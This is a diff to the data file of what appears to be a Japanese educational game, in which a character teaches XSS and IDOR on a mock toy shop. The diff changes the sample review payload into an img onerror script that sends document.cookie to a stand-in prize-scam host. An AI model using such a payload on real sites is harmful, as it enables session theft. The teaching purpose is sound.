@@ -140,12 +140,12 @@ const D={
   alert:[
     {who:SHIRO,t:'レビューに書かれた文字が、そのまま画面の部品として動いてる'},
     {who:SHIRO,t:'投稿の中身を「表示する文字」ではなく「画面の命令」として扱ってるんだ。XSSっていう'},
-    {who:SHIRO,t:"サイトタブのレビュー欄に「<img src=x onerror=\"location='http://偽サイト.example'\">」と書いて、「投稿する」を押してみて"},
+    {who:SHIRO,t:"サイトタブのレビュー欄に「<img src=x onerror=\"location='http://当選プレゼント.example/login?c='+document.cookie\">」と書いて、「投稿する」を押してみて"},
     {who:SHIRO,t:'ほら、ただの文字じゃなく画面の命令として動いた。Cithubで、表示するときに無害化しよう'}
   ],
   demo:{
     kind:'review',
-    payload:'<img src=x onerror="location=\'http://偽サイト.example\'">',
+    payload:'<img src=x onerror="location=\'http://当選プレゼント.example/login?c=\'+document.cookie">',
     product:{name:'ブリキのロボット',price:1800,icon:'item_robot'},
     reviews:[
       {who:'さとう',stars:5,t:'箱もきれいで、昭和の雰囲気そのままでした。'},
@@ -247,7 +247,7 @@ const D={
     kind:'idor',
     myId:1001,
     orders:{
-      1001:{who:'あなた',item:'ブリキのロボット',addr:'東京都○○区△△ 1-2-3（あなたの住所）'},
+      1001:{who:'店長 様',item:'ブリキのロボット',addr:'東京都○○区△△ 1-2-3'},
       1002:{who:'すずき 様',item:'ホーローの看板',addr:'大阪府○○市□□ 4-5-6'},
       1003:{who:'たなか 様',item:'まねき猫の貯金箱',addr:'福岡県○○市◇◇ 7-8-9'}
     }
